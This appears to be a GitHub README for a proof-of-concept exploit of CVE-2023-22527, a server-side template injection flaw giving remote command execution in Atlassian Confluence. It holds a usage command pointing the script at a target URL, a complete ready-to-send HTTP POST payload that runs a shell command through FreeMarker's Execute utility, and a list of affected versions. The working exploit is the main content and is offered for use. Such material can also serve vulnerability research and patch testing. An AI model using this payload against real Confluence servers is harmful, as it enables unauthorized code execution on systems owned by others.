<h1 align="center">
  <br>
  <a href=""><img src="/img/logo.png" alt="" width="300px;"></a>
  <br>
  <img src="https://img.shields.io/badge/PRs-welcome-blue">
  <img src="https://img.shields.io/github/last-commit/kh4sh3i/CVE-2023-22527">
  <img src="https://img.shields.io/github/commit-activity/m/kh4sh3i/CVE-2023-22527">
  <a href="https://twitter.com/intent/follow?screen_name=kh4sh3i_"><img src="https://img.shields.io/twitter/follow/kh4sh3i_?style=flat&logo=twitter"></a>
  <a href="https://github.com/kh4sh3i"><img src="https://img.shields.io/github/stars/kh4sh3i?style=flat&logo=github"></a>
</h1>


# CVE-2023-22527
CVE-2023-22527 | RCE using SSTI in Confluence


# Description
* CVE-2023-22527 refers to an ServerSide template injection vulnerability in freemarker engine that allows users to execute command on the webserver.
* This code is a proof-of-concept (PoC) script for exploiting CVE-2023-22527, which is described as a Server-Side Template Injection (SSTI) vulnerability in Atlassian Confluence.



# USAGE
```
python3 CVE-2023-22527.py -u  http://target.com
```

# Payload
```
POST /template/aui/text-inline.vm HTTP/1.1
Host: 127.0.0.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 278

label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().getWriter().write((new freemarker.template.utility.Execute()).exec({"id"}))
```

# Affected versions
```
8.0.x
8.1.x
8.2.x
8.3.x
8.4.x
8.5.0-8.5.3
```

# References
* [projectdiscovery](https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/)
